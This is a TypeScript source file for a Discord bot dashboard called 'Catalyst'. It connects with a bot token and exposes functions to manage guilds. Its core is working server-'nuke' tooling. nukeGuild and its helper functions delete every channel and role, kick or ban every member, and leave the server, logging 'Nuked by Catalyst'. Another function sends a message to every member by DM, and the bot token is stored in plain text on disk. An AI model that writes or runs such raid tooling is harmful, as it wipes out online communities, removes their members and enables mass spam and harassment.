import { Client, GatewayIntentBits, TextChannel, ChannelType } from "discord.js";
import { readFileSync, writeFileSync, unlinkSync, existsSync } from "fs";
import { join } from "path";
import { logger } from "./logger";

const TOKEN_FILE = join(process.cwd(), ".saved-token");

function saveTokenToDisk(token: string) {
  try { writeFileSync(TOKEN_FILE, token, "utf8"); } catch {}
}

function clearTokenFromDisk() {
  try { if (existsSync(TOKEN_FILE)) unlinkSync(TOKEN_FILE); } catch {}
}

export function loadSavedToken(): string | null {
  try {
    if (existsSync(TOKEN_FILE)) return readFileSync(TOKEN_FILE, "utf8").trim();
  } catch {}
  return null;
}

let client: Client | null = null;
let botUsername: string | null = null;
let botToken: string | null = null;

export async function connectBot(token: string): Promise<{ success: boolean; username?: string; error?: string }> {
  try {
    if (client) {
      await client.destroy();
      client = null;
      botUsername = null;
      botToken = null;
    }

    const newClient = new Client({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages,
      ],
    });

    await new Promise<void>((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error("Connection timed out after 15 seconds"));
      }, 15000);

      newClient.once("ready", () => {
        clearTimeout(timeout);
        resolve();
      });

      newClient.once("error", (err) => {
        clearTimeout(timeout);
        reject(err);
      });

      newClient.login(token).catch((err) => {
        clearTimeout(timeout);
        reject(err);
      });
    });

    client = newClient;
    botToken = token;
    botUsername = client.user?.tag ?? "Unknown Bot";
    saveTokenToDisk(token);
    logger.info({ username: botUsername }, "Bot connected");

    return { success: true, username: botUsername };
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    logger.warn({ error: message }, "Bot connection failed");
    return { success: false, error: message };
  }
}

export async function disconnectBot(): Promise<void> {
  if (client) {
    await client.destroy();
    client = null;
    botUsername = null;
    botToken = null;
    clearTokenFromDisk();
    logger.info("Bot disconnected");
  }
}

export function getBotStatus(): { connected: boolean; username?: string } {
  if (client && client.isReady()) {
    return { connected: true, username: botUsername ?? undefined };
  }
  return { connected: false };
}

export function getGuilds() {
  if (!client || !client.isReady()) {
    return [];
  }
  return client.guilds.cache.map((g) => ({
    id: g.id,
    name: g.name,
    icon: g.iconURL() ?? undefined,
    memberCount: g.memberCount,
  }));
}

export async function getChannels(guildId: string) {
  if (!client || !client.isReady()) {
    throw new Error("Bot not connected");
  }
  const guild = client.guilds.cache.get(guildId);
  if (!guild) {
    throw new Error("Guild not found");
  }
  await guild.channels.fetch();
  return guild.channels.cache
    .filter((c) => c.type === ChannelType.GuildText)
    .map((c) => ({ id: c.id, name: c.name, type: c.type }));
}

export async function getMembers(guildId: string) {
  if (!client || !client.isReady()) {
    return { success: false, members: [], error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.members.fetch();
    const members = guild.members.cache
      .filter((m) => m.id !== client!.user?.id)
      .map((m) => ({
        id: m.id,
        username: m.user.username,
        displayName: m.displayName,
        avatar: m.user.displayAvatarURL() ?? undefined,
        isBot: m.user.bot,
      }));
    return { success: true, members };
  } catch (err: unknown) {
    return { success: false, members: [], error: err instanceof Error ? err.message : String(err) };
  }
}

export async function leaveGuild(guildId: string): Promise<{ success: boolean; message?: string; error?: string }> {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = client.guilds.cache.get(guildId);
    if (!guild) {
      return { success: false, error: "Guild not found" };
    }
    const name = guild.name;
    await guild.leave();
    return { success: true, message: `Left server ${name}` };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err) };
  }
}

export async function deleteAllChannels(guildId: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.channels.fetch();
    const results: { success: boolean; name: string; error?: string }[] = [];
    for (const [, channel] of guild.channels.cache) {
      try {
        const name = channel.name;
        await channel.delete();
        results.push({ success: true, name });
      } catch (err: unknown) {
        results.push({ success: false, name: channel.name, error: err instanceof Error ? err.message : String(err) });
      }
    }
    return { success: true, results };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err), results: [] };
  }
}

export async function deleteAllRoles(guildId: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.roles.fetch();
    const results: { success: boolean; name: string; error?: string }[] = [];
    for (const [, role] of guild.roles.cache) {
      if (role.managed || role.name === "@everyone") continue;
      try {
        const name = role.name;
        await role.delete();
        results.push({ success: true, name });
      } catch (err: unknown) {
        results.push({ success: false, name: role.name, error: err instanceof Error ? err.message : String(err) });
      }
    }
    return { success: true, results };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err), results: [] };
  }
}

export async function kickAllMembers(guildId: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.members.fetch();
    const results: { success: boolean; name: string; error?: string }[] = [];
    for (const [, member] of guild.members.cache) {
      if (member.id === client.user?.id) continue;
      if (!member.kickable) continue;
      try {
        const name = member.user.tag;
        await member.kick("Kicked by Catalyst dashboard");
        results.push({ success: true, name });
      } catch (err: unknown) {
        results.push({ success: false, name: member.user.tag, error: err instanceof Error ? err.message : String(err) });
      }
    }
    return { success: true, results };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err), results: [] };
  }
}

export async function banAllMembers(guildId: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.members.fetch();
    const results: { success: boolean; name: string; error?: string }[] = [];
    for (const [, member] of guild.members.cache) {
      if (member.id === client.user?.id) continue;
      if (!member.bannable) continue;
      try {
        const name = member.user.tag;
        await member.ban({ reason: "Banned by Catalyst dashboard" });
        results.push({ success: true, name });
      } catch (err: unknown) {
        results.push({ success: false, name: member.user.tag, error: err instanceof Error ? err.message : String(err) });
      }
    }
    return { success: true, results };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err), results: [] };
  }
}

export async function unbanAllMembers(guildId: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    const bans = await guild.bans.fetch();
    const results: { success: boolean; name: string; error?: string }[] = [];
    for (const [, ban] of bans) {
      try {
        const name = ban.user.tag;
        await guild.bans.remove(ban.user.id, "Unbanned by Catalyst dashboard");
        results.push({ success: true, name });
      } catch (err: unknown) {
        results.push({ success: false, name: ban.user.tag, error: err instanceof Error ? err.message : String(err) });
      }
    }
    return { success: true, results };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err), results: [] };
  }
}

export async function nukeGuild(
  guildId: string,
  options: { deleteChannels?: boolean; deleteRoles?: boolean; kickAll?: boolean; banAll?: boolean; leaveAfter?: boolean }
) {
  if (!client || !client.isReady()) {
    return { success: false, steps: [], error: "Bot not connected" };
  }

  const steps: { step: string; success: boolean; count?: number; error?: string }[] = [];

  try {
    const guild = await client.guilds.fetch(guildId);

    if (options.deleteChannels) {
      try {
        await guild.channels.fetch();
        let count = 0;
        for (const [, channel] of guild.channels.cache) {
          try { await channel.delete(); count++; } catch {}
        }
        steps.push({ step: "Delete Channels", success: true, count });
      } catch (err: unknown) {
        steps.push({ step: "Delete Channels", success: false, error: err instanceof Error ? err.message : String(err) });
      }
    }

    if (options.deleteRoles) {
      try {
        await guild.roles.fetch();
        let count = 0;
        for (const [, role] of guild.roles.cache) {
          if (role.managed || role.name === "@everyone") continue;
          try { await role.delete(); count++; } catch {}
        }
        steps.push({ step: "Delete Roles", success: true, count });
      } catch (err: unknown) {
        steps.push({ step: "Delete Roles", success: false, error: err instanceof Error ? err.message : String(err) });
      }
    }

    if (options.kickAll) {
      try {
        await guild.members.fetch();
        let count = 0;
        for (const [, member] of guild.members.cache) {
          if (member.id === client.user?.id || !member.kickable) continue;
          try { await member.kick("Nuked by Catalyst"); count++; } catch {}
        }
        steps.push({ step: "Kick All", success: true, count });
      } catch (err: unknown) {
        steps.push({ step: "Kick All", success: false, error: err instanceof Error ? err.message : String(err) });
      }
    }

    if (options.banAll) {
      try {
        await guild.members.fetch();
        let count = 0;
        for (const [, member] of guild.members.cache) {
          if (member.id === client.user?.id || !member.bannable) continue;
          try { await member.ban({ reason: "Nuked by Catalyst" }); count++; } catch {}
        }
        steps.push({ step: "Ban All", success: true, count });
      } catch (err: unknown) {
        steps.push({ step: "Ban All", success: false, error: err instanceof Error ? err.message : String(err) });
      }
    }

    if (options.leaveAfter) {
      try {
        await guild.leave();
        steps.push({ step: "Leave Server", success: true });
      } catch (err: unknown) {
        steps.push({ step: "Leave Server", success: false, error: err instanceof Error ? err.message : String(err) });
      }
    }

    return { success: true, steps };
  } catch (err: unknown) {
    return { success: false, steps, error: err instanceof Error ? err.message : String(err) };
  }
}

export async function banUser(guildId: string, userId: string, reason?: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.bans.create(userId, { reason: reason || "Banned by Catalyst dashboard" });
    return { success: true, message: `User ${userId} banned` };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err) };
  }
}

export async function kickUser(guildId: string, userId: string, reason?: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    const member = await guild.members.fetch(userId);
    if (!member.kickable) {
      return { success: false, error: "Member cannot be kicked (insufficient permissions)" };
    }
    await member.kick(reason || "Kicked by Catalyst dashboard");
    return { success: true, message: `User ${member.user.tag} kicked` };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err) };
  }
}

export async function unbanUser(guildId: string, userId: string, reason?: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.bans.remove(userId, reason || "Unbanned by Catalyst dashboard");
    return { success: true, message: `User ${userId} unbanned` };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err) };
  }
}

export async function dmAllMembers(guildId: string, message: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = await client.guilds.fetch(guildId);
    await guild.members.fetch();
    const results: { success: boolean; name: string; error?: string }[] = [];
    for (const [, member] of guild.members.cache) {
      if (member.id === client.user?.id || member.user.bot) continue;
      try {
        const name = member.user.tag;
        await member.send(message);
        results.push({ success: true, name });
      } catch (err: unknown) {
        results.push({ success: false, name: member.user.tag, error: err instanceof Error ? err.message : String(err) });
      }
    }
    return { success: true, results };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err), results: [] };
  }
}

export async function sendMessage(guildId: string, channelId: string, message: string) {
  if (!client || !client.isReady()) {
    return { success: false, error: "Bot not connected" };
  }
  try {
    const guild = client.guilds.cache.get(guildId);
    if (!guild) {
      return { success: false, error: "Guild not found" };
    }
    const channel = guild.channels.cache.get(channelId);
    if (!channel || !(channel instanceof TextChannel)) {
      return { success: false, error: "Channel not found or not a text channel" };
    }
    await channel.send(message);
    return { success: true };
  } catch (err: unknown) {
    return { success: false, error: err instanceof Error ? err.message : String(err) };
  }
}
